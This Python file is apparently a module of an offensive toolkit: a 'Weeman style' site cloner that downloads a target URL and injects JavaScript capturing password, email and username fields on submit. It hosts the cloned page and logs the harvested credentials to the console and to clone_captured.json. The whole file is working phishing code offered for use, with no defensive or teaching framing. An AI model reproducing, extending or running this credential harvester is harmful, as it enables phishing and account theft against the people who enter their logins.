#!/usr/bin/env python3
import sys, os, http.server, socketserver, threading, json, time, urllib.request
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "core"))
from auth import auth_required
from utils import log_action

CAPTURED_CLONE = []

class CloneHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.serve_cloned_page()
        else:
            self.send_response(404)
            self.end_headers()
    def do_POST(self):
        if self.path == "/capture":
            cl = int(self.headers.get("Content-Length", 0))
            data = self.rfile.read(cl).decode() if cl else ""
            try:
                creds = json.loads(data)
            except:
                creds = {"raw": data}
            entry = {
                "ip": self.client_address[0],
                "time": time.time(),
                "credentials": creds
            }
            CAPTURED_CLONE.append(entry)
            print("\n[CLONER] ====== CREDENTIAL CAPTURED ======")
            print("[CLONER] IP: " + self.client_address[0])
            if isinstance(creds, dict):
                for k, v in creds.items():
                    print("[CLONER] " + str(k) + ": " + str(v))
            else:
                print("[CLONER] Data: " + str(creds))
            print("[CLONER] =================================")
            with open("clone_captured.json", "a") as f:
                f.write(json.dumps(entry) + "\n")
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
        else:
            self.send_response(404)
            self.end_headers()
    def serve_cloned_page(self):
        page_path = os.path.join(os.path.dirname(__file__), "..", "templates", "cloned_index.html")
        if os.path.exists(page_path):
            with open(page_path, "r", encoding="utf-8", errors="ignore") as f:
                html = f.read()
        else:
            html = "<h1>Clone not found. Run clone first.</h1>"
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(html.encode())
    def log_message(self, format, *args):
        pass

@auth_required
def run_cloner():
    print("""
    ╔═══════════════════════════════════════════════════════╗
    ║              URL CLONER MODULE (WEEMAN STYLE)         ║
    ║     Clone | Inject Capture | Log Creds | Host       ║
    ╚═══════════════════════════════════════════════════════╝
    """)
    url = input("[CLONER] Target URL to clone: ").strip()
    if not url.startswith("http"):
        url = "https://" + url
    print("[CLONER] Fetching " + url + "...")
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F)"})
        resp = urllib.request.urlopen(req, timeout=15)
        html = resp.read().decode("utf-8", errors="ignore")
        capture_script = """<script>
document.addEventListener("submit", function(e) {
    e.preventDefault();
    var inputs = document.querySelectorAll("input[type='password'], input[type='email'], input[type='text'], input[name='username'], input[name='user'], input[name='login']");
    var data = {};
    inputs.forEach(function(inp) { if(inp.name || inp.id) data[inp.name || inp.id] = inp.value; });
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/capture", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify(data));
    setTimeout(function() { e.target.submit(); }, 500);
});
</script>"""
        if "</head>" in html:
            html = html.replace("</head>", capture_script + "</head>")
        elif "</body>" in html:
            html = html.replace("</body>", capture_script + "</body>")
        else:
            html = html + capture_script
        os.makedirs(os.path.join(os.path.dirname(__file__), "..", "templates"), exist_ok=True)
        page_path = os.path.join(os.path.dirname(__file__), "..", "templates", "cloned_index.html")
        with open(page_path, "w", encoding="utf-8") as f:
            f.write(html)
        print("[CLONER] Site cloned and injected with credential capture.")
        print("[CLONER] Saved to templates/cloned_index.html")
        host = input("\n[CLONER] Host cloned site now? (y/n): ").strip().lower()
        if host == "y":
            port = int(input("[CLONER] Port (default 8080): ").strip() or "8080")
            server = socketserver.TCPServer(("", port), CloneHandler)
            server_thread = threading.Thread(target=server.serve_forever)
            server_thread.daemon = True
            server_thread.start()
            print("[CLONER] Hosting on http://localhost:" + str(port))
            print("[CLONER] All form submissions will be captured and logged.")
            print("[CLONER] Press CTRL+C to stop.")
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                pass
            server.shutdown()
            print("\n[CLONER] Server stopped.")
            if CAPTURED_CLONE:
                print("[CLONER] " + str(len(CAPTURED_CLONE)) + " credentials captured.")
        log_action("CLONER", "Cloned and hosted " + url)
    except Exception as e:
        print("[CLONER] Error: " + str(e))
        log_action("CLONER", "Failed clone " + url)
